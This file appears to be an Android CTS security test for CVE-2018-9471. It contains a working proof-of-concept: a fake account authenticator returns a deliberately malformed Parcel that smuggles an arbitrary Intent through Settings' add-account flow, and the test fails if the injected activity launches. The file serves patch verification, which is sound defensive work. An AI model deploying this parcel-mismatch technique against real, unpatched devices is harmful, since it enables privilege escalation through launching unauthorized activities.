/*
 * Copyright (C) 2019 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts;

import android.test.AndroidTestCase;
import android.platform.test.annotations.SecurityTest;
import androidx.test.InstrumentationRegistry;

import android.content.pm.ActivityInfo;
import android.content.ComponentName;
import android.content.Context;
import android.content.ContextWrapper;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.Service;

import android.provider.Settings;
import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.AccountManager;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Looper;
import android.os.Parcel;
import android.os.Parcelable;
import android.os.SystemClock;

import android.util.Log;
import android.annotation.Nullable;
import android.platform.test.annotations.AppModeFull;
import static java.lang.Thread.sleep;
import static org.junit.Assert.assertTrue;

@AppModeFull
@SecurityTest
public class NanoAppBundleTest extends AndroidTestCase {

    private static final String TAG = "NanoAppBundleTest";
    private static final String SECURITY_CTS_PACKAGE_NAME = "android.security.cts";

    private ServiceConnection mServiceConnection =
        new ServiceConnection() {

            @Override
            public void onServiceConnected(ComponentName name, IBinder binder) {
                Log.i(TAG, "Authenticator service " + name + " is connected");
            }

            @Override
            public void onServiceDisconnected(ComponentName name) {
                Log.i(TAG, "Authenticator service " + name + "died abruptly");
            }
        };

    @Override
    protected void setUp() throws Exception {
        super.setUp();
        Intent serviceIntent = new Intent(mContext, AuthenticatorService.class);
        mContext.startService(serviceIntent);
        mContext.bindService(serviceIntent, mServiceConnection, Context.BIND_AUTO_CREATE);
    }

    @Override
    protected void tearDown() throws Exception {
        if (mContext != null) {
            Intent serviceIntent = new Intent(mContext, AuthenticatorService.class);
            mContext.stopService(serviceIntent);
        }
        super.tearDown();
    }

    /**
     * b/113527124
     */
    @SecurityTest(minPatchLevel = "2018-09")
    public void testPoc_cve_2018_9471() throws Exception {

        try {
            mContext = InstrumentationRegistry.getInstrumentation().getContext();
            new NanoAppBundleTest.Trigger(mContext).anyAction();
            //  against vulnerable bits, the failure will get caught right after trigger.
            //  against patched bits, 1 minute wait to snap the test
            Thread.sleep(60_000);
        } catch(InterruptedException ignored) {
            Log.i(TAG, "swallow interrupted exception");
        }
    }

    public static class Trigger {
        private static final String TAG = "Trigger";
        private Context mContext;

        public Trigger(Context context) {
            mContext = context;
        }

        private void trigger() {
            Log.i(TAG, "start...");

            String pkg = isCar(mContext) ? "com.android.car.settings" : "com.android.settings";
            String cls = isCar(mContext)
                    ? "com.android.car.settings.accounts.AddAccountActivity"
                    : "com.android.settings.accounts.AddAccountSettings";
            Intent intent = new Intent();
            intent.setComponent(new ComponentName(pkg, cls));
            intent.setAction(Intent.ACTION_RUN);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            String authTypes[] = { SECURITY_CTS_PACKAGE_NAME };
            intent.putExtra("account_types", authTypes);

            ActivityInfo info = intent.resolveActivityInfo(
                    mContext.getPackageManager(), intent.getFlags());
            // Will throw NullPointerException if activity not found.
            if (info != null && info.exported) {
                mContext.startActivity(intent);
            } else {
                Log.i(TAG, "Activity is not exported");
            }
            Log.i(TAG, "finsihed.");
        }

        public void anyAction() {
            Log.i(TAG, "Arbitrary action starts...");

            Intent intent = new Intent();

            intent.setComponent(new ComponentName(
                "android.security.cts",
                "android.security.cts.NanoAppBundleTest$FailActivity"));
            intent.setAction(Intent.ACTION_RUN);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

            Authenticator.setIntent(intent);

            trigger();

            Log.i(TAG, "Arbitrary action finished.");
        }
    }

    //  customized activity
    public static class FailActivity extends Activity {

        @Override
        protected void onCreate(Bundle onSavedInstanceState) {
            super.onCreate(onSavedInstanceState);

            fail("Arbitrary intent executed");
        }
    }

    //
    //  Authenticator class
    //
    public static class Authenticator extends AbstractAccountAuthenticator {

        private static final String TAG = "Authenticator";

        //  mAddAccountDone : flag set to check if the buggy part is got run
        private boolean mAddAccountDone;
        public boolean isAddAccountDone() {
            return mAddAccountDone;
        }
        public void setAddAccountDone(boolean isDone) {
            mAddAccountDone = isDone;
        }

        //  mAuthContext
        private static Context mAuthContext;
        public static Context getAuthContext() {
            return mAuthContext;
        }

        //  mIntent : set from Trigger or setPIN
        private static Intent mIntent;
        public static Intent getIntent() {
            return mIntent;
        }
        public static void setIntent(Intent intent) {
            mIntent = intent;
        }

        //  Authenticator ctor
        public Authenticator(Context context) {
            super(context);
            setAddAccountDone(false);
            Authenticator.mAuthContext = context;
        }

        @Override
        public String getAuthTokenLabel(String authTokenType) {
            return null;
        }

        @Override
        public Bundle editProperties(AccountAuthenticatorResponse accountAuthenticatorResponse,
                                     String accountType) {
            return null;
        }

        @Override
        public Bundle getAuthToken(AccountAuthenticatorResponse accountAuthenticatorResponse,
                                   Account account,
                                   String authTokenType,
                                   Bundle bundle) {
            return null;
        }

        @Override
        public Bundle addAccount(AccountAuthenticatorResponse response,
                                 String accountType,
                                 String authTokenType,
                                 String[] requiredFeatures,
                                 Bundle options) {
            try {
                Log.i(TAG, String.format("addAccount start...accountType = %s, authTokenType = %s",
                                    accountType, authTokenType));
                Bundle bundle = new Bundle();
                Parcel parcel = GenMalformedParcel.nanoAppFilterParcel(mIntent);
                bundle.readFromParcel(parcel);
                parcel.recycle();
                setAddAccountDone(true);
                Log.i(TAG, "addAccount finished");
                return bundle;
            } catch (Exception e) {
                e.printStackTrace();
            }
            return null;
        }

        @Override
        public Bundle confirmCredentials(AccountAuthenticatorResponse accountAuthenticatorResponse,
                                         Account account,
                                         Bundle bundle) {
            return null;
        }

        @Override
        public Bundle updateCredentials(AccountAuthenticatorResponse accountAuthenticatorResponse,
                                        Account account,
                                        String authTokenType,
                                        Bundle bundle) {
            return null;
        }

        @Override
        public Bundle hasFeatures(AccountAuthenticatorResponse accountAuthenticatorResponse,
                                  Account account,
                                  String[] features) {
            return null;
        }
    }

    //
    //  AuthenticatorService
    //
    public static class AuthenticatorService extends Service {

        private static final String TAG = "AuthenticatorService";

        private Authenticator mAuthenticator;
        public Authenticator getAuthenticator() {
            return mAuthenticator;
        }

        private IBinder mBinder;
        public IBinder getServiceBinder() {
            return mBinder;
        }

        public AuthenticatorService() {
        }

        @Override
        public void onCreate() {
            super.onCreate();
            //  critical:here have to pass the service context to authenticator, not mContext
            Log.i(TAG, "creating...");
            mAuthenticator = new Authenticator(this);
        }

        @Override
        public IBinder onBind(Intent intent) {
            try {
                Log.i(TAG, "Bind starting...");
                IBinder binder = mAuthenticator.getIBinder();
                mBinder = binder;
                Log.i(TAG, "Bind finished.");
                return binder;
            } catch (Exception e) {
                Log.i(TAG, "Bind exception");
                e.printStackTrace();
            }
            return null;
        }
    }

    //
    //  GenMalformedParcel
    //
    public static class GenMalformedParcel {

        public static Parcel nanoAppFilterParcel(Intent intent) {
            Parcel data = Parcel.obtain();
            int bundleLenPos = data.dataPosition();
            data.writeInt(0xffffffff);
            data.writeInt(0x4C444E42);
            int bundleStartPos = data.dataPosition();
            data.writeInt(3);

            data.writeString(SECURITY_CTS_PACKAGE_NAME);
            data.writeInt(4);
            data.writeString("android.hardware.location.NanoAppFilter");
            data.writeLong(0);
            data.writeInt(0);
            data.writeInt(0);
            data.writeInt(0);
            data.writeInt(0);
            data.writeInt(0);
            data.writeInt(13);

            int byteArrayLenPos = data.dataPosition();
            data.writeInt(0xffffffff);
            int byteArrayStartPos = data.dataPosition();
            data.writeInt(0);
            data.writeInt(0);
            data.writeInt(0);
            data.writeInt(0);
            data.writeInt(0);
            data.writeInt(0);
            data.writeString(AccountManager.KEY_INTENT);
            data.writeInt(4);
            data.writeString("android.content.Intent");
            intent.writeToParcel(data, 0);
            int byteArrayEndPos = data.dataPosition();
            data.setDataPosition(byteArrayLenPos);
            int byteArrayLen = byteArrayEndPos - byteArrayStartPos;
            data.writeInt(byteArrayLen);
            data.setDataPosition(byteArrayEndPos);

            int bundleEndPos = data.dataPosition();
            data.setDataPosition(bundleLenPos);
            int bundleLen = bundleEndPos - bundleStartPos;
            data.writeInt(bundleLen);
            data.setDataPosition(0);

            return data;
        }
    }

    private static boolean isCar(Context context) {
        PackageManager pm = context.getPackageManager();
        return pm.hasSystemFeature(PackageManager.FEATURE_AUTOMOTIVE);
    }
}
